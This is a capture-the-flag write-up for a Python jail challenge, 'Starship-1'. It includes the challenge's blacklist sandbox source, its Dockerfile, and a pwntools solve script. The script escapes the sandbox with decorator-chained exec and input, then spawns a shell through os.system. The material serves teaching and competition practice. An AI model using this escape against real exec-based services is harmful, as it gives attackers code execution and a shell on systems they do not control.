# Starship-1
> I didn't solve this challenge during the CTF. So I'm going to **record** the intended solution here.  
## Attachments
sandbox.py
```
#!/usr/bin/env python3
import re
import sys

class Nobuffers:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        self.stream.write(data)
        self.stream.flush()

    def writelines(self, datas):
        self.stream.writelines([f"{data}\n" for data in datas])
        self.stream.flush()

    def __getattr__(self, attr):
        return getattr(self.stream, attr)

banned = re.escape('\\(~}?>{&/%`)<$|*=#!-+\'0123456789;[] ')
stdout = Nobuffers(sys.stdout)
stdout.write('''
                                                                         
        __..,,-----l"|-.                                                  
    __/"__  |----""  |  i--voo..,,__                                      
 .-'=|:|/\|-------o.,,,---. Y88888888o,,_                                 
_+=:_|_|__|_|   ___|__|___-|  """"`"""`----------.........___          
__============:' "" |==|__\===========(=>=+    |           ,_, .-"`--..._ 
  ;="|"|  |"| `.____|__|__/===========(=>=+----+===-|---------<---------_=-
 | ==|:|\/| |   | o|.-'__,-|   .'  _______|o  `----'|        __\ __,.-'"  
  "`--""`--"'"""`.-+------'" .'  _L___,,...-----------"""""""   "         
                  `------""""""""
       
''')

stdout.write('Enter command: ')
prompt = input()

if prompt.isascii() and not re.findall(f'[{banned}]', prompt):
    try:
        exec(prompt, {'__builtins__': {'__build_class__': __build_class__, "__name__":__name__}})
    except:
        pass

```

docker:
```
FROM python:alpine


RUN apk --update add socat

WORKDIR /opt/chal
COPY sandbox.py /opt/chal/sandbox.py
COPY flag.txt /flag.txt

# Securing files
RUN chown -R root:root /opt/chal/

# Securing environ
RUN chmod 700 /bin/* /tmp /dev/shm
RUN chmod 755 /usr/bin/env /bin/sh /usr/bin/nc /bin/cat /usr/bin/wget /usr/bin/groups /usr/bin/id /bin/ls /usr/bin/vi

USER nobody

EXPOSE 5000

CMD socat \ 
      TCP-LISTEN:5000,reuseaddr,fork \ 
      EXEC:/opt/chal/sandbox.py

```
## Solution
This is a pyjail escape challenge with only `@^_":,.` and ACSII letters can be used.  

solve.py
```python
from pwn import *

#p = process('./sandbox.py')
p = remote("starship-1.chal.crewc.tf", 40003)
p.sendline('@__build_class__.__self__.exec\r@__build_class__.__self__.input\rclass\x0cx:pass')
p.sendline('__build_class__.__self__.__import__("os").system("sh")')
p.interactive()
```
Because  
```python
@exec
@input
class x:pass
```
is equivalent to  
```python
exec(input())
```